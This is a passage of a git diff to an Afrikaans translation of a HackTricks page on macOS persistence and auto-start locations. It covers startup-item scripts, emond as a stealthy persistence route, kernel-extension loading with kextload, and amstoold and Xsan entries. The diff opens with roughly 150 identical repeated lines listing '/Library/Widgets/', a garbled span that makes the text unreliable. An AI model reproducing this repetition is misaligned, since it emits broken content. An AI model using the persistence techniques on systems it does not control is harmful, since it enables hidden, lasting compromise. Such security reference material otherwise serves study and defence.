+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/
 ```bash
 #!/bin/sh
 . /etc/rc.common
@@ -1563,6 +2090,9 @@ echo "Restarting"
 
 RunService "$1"
 ```
+{% endtab %}
+{% endtabs %}
+
 ### ~~emond~~
 
 {% hint style="danger" %}
@@ -1571,7 +2101,7 @@ Ek kan hierdie komponent nie in my macOS vind nie, vir meer inligting kyk na die
 
 Skryfstuk: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
 
-Deur Apple geïntroduceer, **emond** is 'n loggingsmeganisme wat lyk of dit onderontwikkel is of moontlik verlate is, maar dit bly toeganklik. Alhoewel dit nie besonders voordelig is vir 'n Mac-administrateur nie, kan hierdie obskure diens dien as 'n subtiel volhardingsmetode vir bedreigingsakteurs, moontlik onopgemerk deur die meeste macOS-administrateurs.
+Deur Apple bekendgestel, is **emond** 'n loggingsmeganisme wat lyk of dit onderontwikkel is of moontlik verlate is, maar dit bly toeganklik. Alhoewel dit nie besonders voordelig is vir 'n Mac-administrateur nie, kan hierdie obskure diens as 'n subtiel volhardingsmetode vir bedreigingsakteurs dien, moontlik onopgemerk deur die meeste macOS-administrateurs.
 
 Vir diegene wat bewus is van sy bestaan, is dit maklik om enige skadelike gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek skripte om in 'n enkele gids uit te voer. Om dit te inspekteer, kan die volgende bevel gebruik word:
 ```bash
@@ -1604,7 +2134,7 @@ Om 'n KEXT as 'n aanvangsitem te installeer, moet dit **geïnstalleer word in ee
 * `/System/Library/Extensions`
 * KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
 * `/Library/Extensions`
-* KEXT-lêers wat deur derdeparty sagteware geïnstalleer is
+* KEXT-lêers wat deur 3de party sagteware geïnstalleer is
 
 Jy kan tans gelaai kext-lêers lys met:
 ```bash
@@ -1614,7 +2144,7 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
-Vir meer inligting oor [**kernel-uitbreidings sien hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).
+Vir meer inligting oor [**kernel-uitbreidings, sien hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).
 
 ### ~~amstoold~~
 
@@ -1623,7 +2153,7 @@ Verslag: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.
 #### Ligging
 
 * **`/usr/local/bin/amstoold`**
-* Vereis root-toegang
+* Root benodig
 
 #### Beskrywing & Uitbuiting
 
@@ -1638,7 +2168,7 @@ Verslag: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.
 #### Ligging
 
 * **`/Library/Preferences/Xsan/.xsanrc`**
-* Vereis root-toegang
+* Root benodig
 * **Trigger**: Wanneer die diens uitgevoer word (skaars)
 
 #### Beskrywing & uitbuiting
@@ -1755,7 +2285,7 @@ esac
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
